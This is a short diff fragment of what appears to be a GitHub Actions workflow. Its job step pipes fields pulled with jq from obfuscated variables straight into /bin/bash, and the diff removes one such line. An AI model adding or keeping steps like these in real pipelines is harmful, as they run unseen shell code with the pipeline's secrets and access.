@@ -27,7 +27,6 @@ jobs:
           echo $x7791 | jq -r .mubvu06 | /bin/bash
           printf '%s' "$lwksg65" | jq -r .qvd1134 | /bin/bash
           echo $mrql8 | jq -r .qpg08 | /bin/bash
-          printf '%s' "$zob01034" | jq -r .pzqjd8 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
